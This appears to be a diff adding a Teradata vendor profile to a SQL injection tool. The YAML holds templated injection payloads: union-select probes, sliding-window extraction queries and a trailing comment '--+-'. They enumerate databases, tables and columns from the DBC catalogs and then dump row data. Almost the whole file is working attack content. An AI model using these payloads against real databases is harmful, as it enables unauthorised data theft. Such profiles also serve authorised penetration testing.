@@ -1,0 +1,120 @@
+vendor: Teradata
+# jdbc:teradata://127.0.0.1
+# dbc dbc
+
+resource:
+ info: |
+  select
+      '-'
+      || '${enclose_value_sql}'
+      || database
+      || '${enclose_value_sql}'
+      || user
+      || '${trail_sql}'
+
+ schema:
+  database: |
+   select
+       '${enclose_value_sql}'
+       || DatabaseName
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   FROM (
+       select
+           DatabaseName,
+           row_number() over (order by DatabaseName) AS rnum
+       from DBC.DBASE
+   ) x
+   where 1 = 1
+   ${limit}
+
+  table: |
+   select
+       '${enclose_value_sql}'
+       || TVMName
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   FROM (
+       select
+           TVMName,
+           row_number() over (order by TVMName) AS rnum
+       from DBC.TVM t
+       inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
+       where DatabaseName = '${database}'
+   ) x
+   where 1 = 1
+   ${limit}
+
+  column: |
+   select
+       '${enclose_value_sql}'
+       || FieldName
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+   FROM (
+       select
+           FieldName,
+           row_number() over (order by FieldName) AS rnum
+       from (
+           select distinct FieldName
+           from DBC.TVFIELDS c
+           inner join DBC.TVM t on c.TableId = t.TVMId
+           inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
+           where DatabaseName = '${database}'
+           and TVMName = '${table}'
+       )x
+   )x
+   where 1 = 1
+   ${limit}
+
+  row:
+   query: |
+    select
+        '${enclose_value_sql}'
+        || r
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+    from (
+        select
+            ${fields} r,
+            row_number() over (order by 1) AS rnum
+        from ${database}.${table}
+    )x
+    where 1 = 1
+    ${limit}
+   fields:
+    field: trim(coalesce(''||${field.value}, ''))
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
+        */
+       '${lead}'
+       || nullif(
+           substr(
+               (${injection}),
+               ${window.char}
+           ),
+           '${trail_sql}'
+        )
+  limit: and rnum between ${limit.value} and ${limit.value}
+  failsafe: trim('' || (1337${indice}7330%2b1))
+  calibrator: |
+   cast(
+       rpad(
+           '${calibrator_sql}',
+           1024,
+           '${calibrator_sql}'
+       )
+       as varchar(1024)
+   )
+  limitBoundary: 1
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - Teradata database
+
+ normal:
+  indices: union select ${indices} from (select 1 as x)x
+  capacity: (select '${lead}${indice}' || ${calibrator})
+  orderBy: order by 1337
